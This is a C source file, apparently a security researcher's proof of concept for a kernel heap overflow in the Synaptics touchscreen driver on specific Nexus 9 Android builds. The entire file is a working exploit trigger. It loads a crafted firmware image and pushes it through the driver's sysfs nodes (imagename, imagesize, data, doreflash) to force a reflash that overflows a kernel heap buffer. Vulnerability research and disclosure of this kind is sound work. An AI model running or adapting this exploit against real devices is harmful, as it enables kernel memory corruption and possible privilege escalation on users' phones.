// 3.c
//
// WARNING: Ugly code; written with haste.
//
// POC for Kernel Heap Overflow #3
// TESTED ON:
// [ro.build.fingerprint]:
// [google/volantis/flounder:6.0.1/MOB30W/3031100:user/release-keys]
// [google/volantis/flounder:7.0/NRD90M/3085278:user/release-keys]
//
// Sagi Kedmi, 29.08.2016, IBM Security.

#define SYSFS_SYNAPTICS_IMAGENAME "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/imagename"
#define SYSFS_SYNAPTICS_IMAGESIZE "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/imagesize"
#define SYSFS_SYNAPTICS_DOREFLASH "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/doreflash"
#define SYSFS_SYNAPTICS_DATA "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/data"

#define MAX_IMAGE_NAME_LEN 256

#include <errno.h>                                                              
#include <stddef.h>                                                             
#include <stdio.h>                                                              
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>                                                             
#include <string.h>                                                             
#include <unistd.h>                                                             
#include <fcntl.h>                                                              
#include <time.h>                                                               
#include <sys/types.h>                                                          
#include <sys/stat.h>                                                           
#include <sys/time.h> 

char fw_img_name[MAX_IMAGE_NAME_LEN];

// Set imagename to be fw_img_name.
int set_image_name(){
    int fd;
    int fw_img_name_len;

    fw_img_name_len = strlen(fw_img_name) + 1;
    fd = open(SYSFS_SYNAPTICS_IMAGENAME, O_WRONLY);
    if (fd < 0){
        perror("Failed to open \"imagename\" virtual file");
        return EXIT_FAILURE;
    }

    if (write(fd, fw_img_name, fw_img_name_len) != fw_img_name_len){
        perror("Failed to write payload entirely");
        close(fd);
        return EXIT_FAILURE;
    }
    close(fd);
    return EXIT_SUCCESS;
}

int set_image_size(unsigned int fw_img_size){
    int fd;
    char buf_size[10];

    fd = open(SYSFS_SYNAPTICS_IMAGESIZE, O_WRONLY);
    sprintf(buf_size,"%u", fw_img_size);

    if (fd < 0){
        perror("Failed to open \"imagesize\" virtual file");
        return EXIT_FAILURE;
    }

    if (write(fd, buf_size, strlen(buf_size) + 1) != (strlen(buf_size) + 1)){
        perror("Failed to write heap buffer size entirely");
        close(fd);
        return EXIT_FAILURE;
    }
    close(fd);
}

void print_mem(void const *vp, size_t n)                                        
{                                                                               
    unsigned char const *p = vp;                                                
    int i;                                                                      
    for (i=0; i<n; i++)                                                         
        printf("%02x", p[i]);                                                   
    putchar('\n');                                                              
}    

// Loading img from filesystem
int get_image_data(unsigned char **fw_img, unsigned int *fw_img_size){
    FILE *fp;

    if (!(fp = fopen(fw_img_name, "r"))) {
        perror("blechs");
        return EXIT_FAILURE;
    }
    fseek(fp, 0L, SEEK_END);

    *fw_img_size = ftell(fp);
    fseek(fp, 0L, SEEK_SET);

    *fw_img = (unsigned char *)malloc(*fw_img_size + 1);
    if (!fw_img){
        perror("Failed to allocate memory for fw_img");
        return EXIT_FAILURE;
    }

    fread(*fw_img, 1, *fw_img_size, fp);

    fclose(fp);
    return EXIT_SUCCESS;
}

// Upload img to kernelspace
int set_image_data(unsigned char *fw_img, unsigned int fw_img_size){
    FILE *fp;
    if (!(fp = fopen(SYSFS_SYNAPTICS_DATA, "wb"))){
        perror("Failed to open \"data\" virtual file");
        return EXIT_FAILURE;
    }
    if (fwrite(fw_img, 1, fw_img_size, fp) != fw_img_size){
        perror("Failed to write payload entirely");
        fclose(fp);
        return EXIT_FAILURE;
    }
    fclose(fp);
    return EXIT_SUCCESS;
}
// Reflash the driver with our crafted .img 
int set_doreflash(){
    int fd;
    fd = open(SYSFS_SYNAPTICS_DOREFLASH, O_WRONLY);
    if (fd < 0){
        perror("Failed to open \"data\" virtual file");
        return EXIT_FAILURE;
    }

    if (write(fd, "1", 2) != 2){
        perror("Failed to write payload entirely");
        close(fd);
        return EXIT_FAILURE;
    }
    close(fd);
    return EXIT_SUCCESS;
}

static void usage (){
    printf("Usage: ./inject <firmware_img>\n");
}

int main (int argc, char* argv[]){
    unsigned int fw_img_size;
    unsigned char *fw_img;

    if (argc != 2){
        usage();
        return EXIT_FAILURE;
    }

    strncpy(fw_img_name, argv[1], MAX_IMAGE_NAME_LEN - 1);

    get_image_data(&fw_img, &fw_img_size);

    set_image_name();    
    set_image_size(fw_img_size);
    set_image_data(fw_img, fw_img_size);
    set_doreflash();
    
    free(fw_img);

    return EXIT_SUCCESS; 
}
